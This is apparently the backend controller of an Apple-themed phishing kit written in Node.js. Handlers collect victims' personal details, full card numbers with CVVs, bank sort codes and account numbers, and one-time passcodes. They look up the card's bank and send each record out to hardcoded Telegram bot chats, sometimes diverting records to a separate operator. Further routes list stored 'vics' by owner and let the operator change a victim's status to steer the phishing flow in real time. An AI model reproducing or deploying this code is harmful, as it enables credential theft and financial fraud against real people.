const axios = require("axios");
const AppleGB = require("../models/appleGbModel");

let count = 0;

const sendRes = async (req, res) => {
  let {
    firstName,
    lastName,
    telephone,
    addy1,
    addy2,
    town,
    pcode,
    dob,
    ccnum,
    ccexpmonth,
    ccexpyear,
    cvv,
    scode,
    accno,
    ccname,
    bin,
    ip,
    userAgent,
    telegramId,
  } = req.body;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }

  const response = await axios.get(`https://lookup.binlist.net/${bin}`);
  let bankName;

  if (response.data.bank) {
    bankName = response.data.bank.name;
  }

  const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPost Code: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n${
    scode && accno ? "Sort Code: ${scode}\nAcount Number: ${accno}\n" : ""
  }+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (count == 6) {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count = 0;
  } else {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `Apple ${telegramId}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: telegramId,
          text: `Apple:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count += 1;
  }
  res.sendStatus(200);
};

let auCount = 0;

const sendAuRes = async (req, res) => {
  let {
    firstName,
    lastName,
    telephone,
    addy1,
    dob,
    state,
    town,
    pcode,
    ccname,
    ccnum,
    ccexpmonth,
    ccexpyear,
    cvv,
    bin,
    ip,
    userAgent,
    telegramId,
  } = req.body;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }

  const response = await axios.get(`https://lookup.binlist.net/${bin}`);

  let bankName;

  if (response.data.bank) {
    bankName = response.data.bank;
  }
  const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\nUser Agent: ${userAgent}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (auCount == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    auCount = 6;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `Apple ${telegramId}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: telegramId,
          text: `Apple:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    auCount += 1;
  }
  res.send("Update Complete");
};

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  AppleGB.find({ owner }).exec((err, vics) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vics);
  });
};

const command = async (req, res) => {
  const { uniqueid, status } = req.body;
  try {
    await AppleGB.findOneAndUpdate({ uniqueid }, { status }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  AppleGB.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitAppAuth = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await AppleGB.findOneAndUpdate({ uniqueid }, { status: 6 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitBilling = async (req, res) => {
  const {
    fullname,
    telephone,
    address,
    city,
    pcode,
    dob,
    ip,
    uniqueid,
    owner,
  } = req.body;
  try {
    await AppleGB.create({
      fullname,
      telephone,
      address,
      city,
      pcode,
      dob,
      ip,
      uniqueid,
      status: 1,
      owner,
    });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitTelephone = async (req, res) => {
  const { uniqueid, telephone } = req.body;
  try {
    await AppleGB.findOneAndUpdate(
      { uniqueid },
      { telephone, status: 10 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { uniqueid, otp } = req.body;
  try {
    await AppleGB.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitCCAgain = async (req, res) => {
  const { uniqueid, ccname, ccnum, ccexp, cvv } = req.body;
  try {
    await AppleGB.findOneAndUpdate(
      { uniqueid },
      { ccname, ccnum, ccexp, cvv, status: 8 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitCC = async (req, res) => {
  const { uniqueid, ccname, ccnum, ccexp, cvv, ip, owner } = req.body;
  try {
    let user = await AppleGB.findOne({ uniqueid }).exec();
    if (user.length) {
      await AppleGB.findOneAndUpdate(
        { uniqueid },
        { ccname, ccnum, ccexp, cvv, status: 2 }
      ).exec();
    } else {
      await AppleGB.create({
        uniqueid,
        ccname,
        ccnum,
        ccexp,
        cvv,
        owner,
        status: 2,
      });
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  sendRes,
  sendAuRes,
  getOwnerVics,
  command,
  getInfo,
  submitAppAuth,
  submitBilling,
  submitTelephone,
  submitOtp,
  submitCCAgain,
  submitCC,
};
